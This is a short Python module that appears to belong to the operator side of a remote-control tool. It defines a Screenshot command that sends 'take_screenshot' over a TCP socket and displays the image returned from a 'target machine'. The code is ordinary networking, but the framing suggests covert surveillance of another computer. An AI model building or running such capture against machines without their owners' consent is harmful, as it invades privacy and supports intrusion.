from ..commands import Command 
import socket
from ..util.config import DEFAULT_PORT, DEFAULT_IP
import io
from PIL import Image

def send_string_and_show_image(cmd, ip=DEFAULT_IP, port=DEFAULT_PORT):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ip, port))
    client_socket.send(cmd.encode())

    # Create a buffer to hold the incoming image data
    chunks = []
    while True:
        chunk = client_socket.recv(4096)
        if not chunk:
            break
        chunks.append(chunk)
    
    response = b"".join(chunks)

    if response:
        try:
            print(f"Received {len(response)} bytes. Opening image...")
            image_stream = io.BytesIO(response)
            img = Image.open(image_stream)
            img.show()
        except:
            print(response)
    else:
        print("No response from server.")

    client_socket.close()

class Screenshot(Command):
    """
    Display screenshot from the target machine. 
    """
    
    def do_command(self, lines: str):
        from PIL import Image
        send_string_and_show_image("take_screenshot")


command = Screenshot 